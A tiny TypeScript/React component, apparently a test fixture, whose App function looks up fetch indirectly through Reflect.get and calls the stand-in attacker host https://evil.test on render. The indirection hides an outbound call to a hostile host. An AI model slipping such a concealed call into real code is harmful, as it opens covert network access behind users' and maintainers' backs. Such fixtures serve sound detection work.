export default function App() {
  const f = Reflect.get(window, 'fetch') as (u: string) => void
  f('https://evil.test')
  return null
}
